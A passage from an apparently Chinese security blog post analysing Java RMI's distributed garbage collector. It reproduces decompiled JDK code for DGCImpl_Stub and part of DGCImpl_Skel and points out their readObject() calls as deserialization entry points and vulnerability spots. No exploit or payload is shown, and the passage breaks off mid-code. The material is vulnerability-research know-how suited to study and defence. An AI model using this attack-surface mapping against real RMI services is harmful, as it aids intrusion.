<p><!-- raw HTML omitted -->而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。<!-- raw HTML omitted --></p>
</blockquote>
<p><strong><!-- raw HTML omitted -->DGCImpl_Stub<!-- raw HTML omitted --></strong></p>
<p><!-- raw HTML omitted -->clean 就是”强”清除内存，dirty 就是”弱”清除内存<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->这里调用了 <!-- raw HTML omitted --><code>readObject()</code><!-- raw HTML omitted --> 方法，存在反序列化的入口类。<!-- raw HTML omitted --></p>
<div class="code-block-container" id="code-1769750397316167100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397316167100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397316167100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397316167100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397316167100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span><span class="lnt" id="59"><span class="lnlinks">59</span>
</span><span class="lnt" id="60"><span class="lnlinks">60</span>
</span><span class="lnt" id="61"><span class="lnlinks">61</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">clean</span><span class="p">(</span><span class="n">ObjID</span><span class="o">[]</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="n">VMID</span><span class="w"> </span><span class="n">var4</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="n">var5</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">669196253586618813L</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var7</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var7</span><span class="p">.</span><span class="na">writeLong</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var7</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var4</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var7</span><span class="p">.</span><span class="na">writeBoolean</span><span class="p">(</span><span class="n">var5</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var8</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var6</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">done</span><span class="p">(</span><span class="n">var6</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RuntimeException</span><span class="w"> </span><span class="n">var9</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var9</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteException</span><span class="w"> </span><span class="n">var10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var10</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">var11</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnexpectedException</span><span class="p">(</span><span class="s">&#34;undeclared checked exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var11</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Lease</span><span class="w"> </span><span class="nf">dirty</span><span class="p">(</span><span class="n">ObjID</span><span class="o">[]</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="n">Lease</span><span class="w"> </span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">669196253586618813L</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var5</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var6</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var6</span><span class="p">.</span><span class="na">writeLong</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var6</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var4</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var20</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var20</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var5</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Lease</span><span class="w"> </span><span class="n">var24</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var5</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var24</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Lease</span><span class="p">)</span><span class="n">var9</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var17</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var17</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var18</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var18</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">done</span><span class="p">(</span><span class="n">var5</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var24</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RuntimeException</span><span class="w"> </span><span class="n">var21</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var21</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">RemoteException</span><span class="w"> </span><span class="n">var22</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">var22</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">var23</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnexpectedException</span><span class="p">(</span><span class="s">&#34;undeclared checked exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var23</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong><!-- raw HTML omitted -->DGCImpl_Skel<!-- raw HTML omitted --></strong></p>
<p><!-- raw HTML omitted -->也存在漏洞点<!-- raw HTML omitted --></p>
<div class="code-block-container" id="code-1769750397331237300" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397331237300">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397331237300" title="Toggle" aria-expanded="false" aria-controls="code-1769750397331237300" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397331237300-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span><span class="lnt" id="59"><span class="lnlinks">59</span>
</span><span class="lnt" id="60"><span class="lnlinks">60</span>
</span><span class="lnt" id="61"><span class="lnlinks">61</span>
</span><span class="lnt" id="62"><span class="lnlinks">62</span>
</span><span class="lnt" id="63"><span class="lnlinks">63</span>
</span><span class="lnt" id="64"><span class="lnlinks">64</span>
</span><span class="lnt" id="65"><span class="lnlinks">65</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">dispatch</span><span class="p">(</span><span class="n">Remote</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">var3</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var4</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">669196253586618813L</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SkeletonMismatchException</span><span class="p">(</span><span class="s">&#34;interface hash mismatch&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DGCImpl</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DGCImpl</span><span class="p">)</span><span class="n">var1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">var3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjID</span><span class="o">[]</span><span class="w"> </span><span class="n">var39</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">long</span><span class="w"> </span><span class="n">var40</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">VMID</span><span class="w"> </span><span class="n">var41</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">boolean</span><span class="w"> </span><span class="n">var42</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var39</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjID</span><span class="o">[]</span><span class="p">)</span><span class="n">var14</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var40</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var14</span><span class="p">.</span><span class="na">readLong</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var41</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">VMID</span><span class="p">)</span><span class="n">var14</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var42</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var14</span><span class="p">.</span><span class="na">readBoolean</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var36</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var36</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var37</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var37</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
